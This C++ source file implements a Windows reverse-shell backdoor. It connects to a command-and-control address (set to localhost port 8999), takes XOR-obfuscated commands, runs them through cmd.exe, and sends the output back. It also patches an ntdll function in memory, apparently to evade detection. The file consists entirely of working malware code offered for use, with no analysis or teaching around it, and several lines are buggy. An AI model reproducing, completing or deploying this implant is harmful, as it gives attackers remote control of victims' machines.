#include <WinSock2.h>
#include <string>
#include <cstdio>
#include <Windows.h>
#include <ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")

#define BUF_LEN 4096


using namespace std;

HANDLE STDIN_RD, STDIN_WR;
HANDLE STDOUT_RD, STDOUT_WR;
HANDLE STDERR_RD, STDERR_WR;
SECURITY_ATTRIBUTES seca;
SOCKET sock;
STARTUPINFOA sinfo;
PROCESS_INFORMATION pinfo;


struct addrinfo hints, * res = NULL, * ptr = NULL;

int sizer = 0;

void setupPipe(void);
void initsock(void);
void createProc(string cmdarr);

void XOR(char dat[], int size)
{
	char k = 'x';

	for (int i = 0; i < size; i++)
	{
		dat[i] = dat[i] ^ k;
	}
	sizer = sizeof(dat);
}




int main()
{	

	//Defense
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dcp = {};
	dcp.ProhibitDynamicCode = 1;
	SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &dcp, sizeof(dcp));

	WriteProcessMemory(GetCurrentProcess(), GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateUserProcess"), "\0x4C\0x8B\0xD1\0xB8", 5, NULL);
	

	start:

	char buf[BUF_LEN];
	
	
	// Startup sock and WSA
	
	initsock();

	//cmd startup 
	zero:
	string cmdDefault = "0";
	string cmd;
	int len;
	int index = 0;
	
	while (1)
	{
		
		ZeroMemory(&buf, BUF_LEN);

		len = recv(sock, buf, BUF_LEN, 0);
		XOR(buf, strlen(buf));
		cmd = buf;
		if (string(cmd).substr(0,1) == "0")
		{
			closesocket(sock);
			WSACleanup();

			initsock();
			ZeroMemory(&buf, BUF_LEN);
			recv(sock, buf, BUF_LEN, 0);
			cmd.erase();
			cmd = buf;
		}
		

		createProc(cmd);
		
		 
		

		for (;;)
		{
			bool bcode = FALSE;
			DWORD dwRead, dwWritten;
			string result = "";
			char* arr;

			// Rd from pipe and send to 
			bcode = ReadFile(STDOUT_RD, buf, BUF_LEN, &dwRead, NULL);
			if (!bcode || dwRead == 0) break;
			
			XOR(buf, strlen(buf));
			send(sock, buf,	dwRead, 0);
		}

		ZeroMemory(&buf, BUF_LEN);

		for (;;)
		{
			bool bcode = FALSE;
			DWORD dwRead, dwWritten;
			string result = "";
			char* arr;

			// Rd from pipe and send to 
			bcode = ReadFile(STDERR_RD, buf, BUF_LEN, &dwRead, NULL);
			if (!bcode || dwRead == 0) break;

			XOR(buf, strlen(buf));
			send(sock, buf, dwRead, 0);
		}

		
	}
}



void setupPipe()
{
	start:

	ZeroMemory(&seca, sizeof(SECURITY_ATTRIBUTES));
	seca.nLength = sizeof(SECURITY_ATTRIBUTES);
	seca.bInheritHandle = TRUE;
	seca.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&STDOUT_RD, &STDOUT_WR, &seca, BUF_LEN))
	{
		goto start;
	}

	if (!SetHandleInformation(STDOUT_RD, HANDLE_FLAG_INHERIT, 0))
	{
		//send err;
		goto start;
	}

	if (!CreatePipe(&STDIN_RD, &STDIN_WR, &seca, BUF_LEN))
	{
		goto start;
	}

	if (!SetHandleInformation(STDIN_WR, HANDLE_FLAG_INHERIT, 0))
	{
		goto start;
	}
	if (!CreatePipe(&STDERR_RD, &STDERR_WR, &seca, BUF_LEN))
	{
		goto start;
	}
	if (!SetHandleInformation(STDERR_RD, HANDLE_FLAG_INHERIT, 0))
	{
		goto start;
	}
	
}


void createProc(string cmdarr)
{
	procstart:

	ZeroMemory(&sinfo, sizeof(STARTUPINFOA));
	ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
	sinfo.cb = sizeof(STARTUPINFOA);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	setupPipe();

	sinfo.hStdError = STDERR_WR;
	sinfo.hStdOutput = STDOUT_WR;
	sinfo.hStdInput = STDIN_RD;
	
	string cmdpre = "/C " + cmdarr;
	
	char* arg = &cmdpre[0];

	if (cmdarr == "0")
	{
		
		CreateProcessA("C:\\WINDOWS\\SYSTEM32\\CMD.EXE", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
	}
	else
	{
		bool ret = CreateProcessA("C:\\WINDOWS\\SYSTEM32\\CMD.EXE", arg, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
		if (ret = 0)
		{
			char err[] = "Process creation error";
			char errcode[] = { GetLastError() };
			send(sock, err, sizeof(err), 0);
			send(sock, errcode, sizeof(errcode), 0);
		}
	}

	WaitForSingleObject(pinfo.hProcess, INFINITE);

	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);


	CloseHandle(STDOUT_WR);
	CloseHandle(STDERR_WR);
}

void initsock()
{
	int iresult = 0;
	bool bresult = FALSE;
	char C2Server[] = { "127.0.0.1" };
	char C2Port[] = { "8999" };



	//init vars - zero mem of struct that will contain networking information
	sock = INVALID_SOCKET;
	WSADATA wsadat;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	//init wsa - err check
	iresult = WSAStartup(MAKEWORD(2, 2), &wsadat);
	if (iresult != 0)
	{
		printf("WSA startup failed: %d\n", iresult);
	}



	//resolve dns - err check
	iresult = getaddrinfo(C2Server, C2Port, &hints, &res);
	if (iresult != 0)
	{
		printf("GetAddr failed: %d\n", iresult);
		WSACleanup();
	}

	//Create socket for connectin to server and err check
	ptr = res;
	sock = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, 0, 0, 0);

	if (sock == INVALID_SOCKET)
	{
		printf("Error at socket call: %ld\n", WSAGetLastError());
		freeaddrinfo(res);
		WSACleanup();
	}
	else
	{
		char welcome[] = "[+] HELLO XSGEN";
		XOR(welcome, strlen(welcome));



		for (;;)
		{
			int r = connect(sock, ptr->ai_addr, ptr->ai_addrlen);
			if (r == 0) break;
		}
		send(sock, welcome, sizeof(welcome) - 1, 0);
	}
}
